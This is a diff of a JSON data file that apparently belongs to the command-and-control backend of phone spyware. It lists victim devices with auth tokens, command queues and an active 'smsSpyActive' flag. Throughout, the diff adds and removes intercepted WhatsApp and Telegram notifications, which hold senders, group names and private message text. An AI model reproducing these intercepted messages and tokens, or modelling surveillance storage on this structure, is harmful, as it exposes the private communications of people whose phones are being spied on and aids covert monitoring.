@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777708672,
+    "lastSeen": 1776777711703,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (100 pesan): ~ BASS STR",
+        "content": "📷 SS DONE POLOSAN SG LUMUT SOLD 65K",
+        "time": "21/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777710948
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB1 ALDY BANYUMAS JATENG (66 pesan): ~ yaping",
+        "content": "ala sihh",
+        "time": "21/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777710344
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB || MANZZ KALBAR (961 pesan): ~ ada",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775480114
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3719 pesan dari 23 chat",
-        "time": "21/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775478121
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (78 pesan): ~ JURAGAN RAIHAN MARKET OWNER CBN",
-        "content": "📷 Op? F spek pm",
-        "time": "21/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775477855
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777709582,
+    "lastSeen": 1776777710792,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16804 pesan baru dari 118 obrolan",
+        "time": "21/04 20:21",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777712173
+      },
       {
         "appName": "Telegram",
         "sender": "Fastcal haikk",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:48",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776775681565
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: ZEEIN STORE",
-        "content": "Rate brpa perchat nya",
-        "time": "21/04 19:48",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775681486
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777708072,
+    "lastSeen": 1776777711001,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
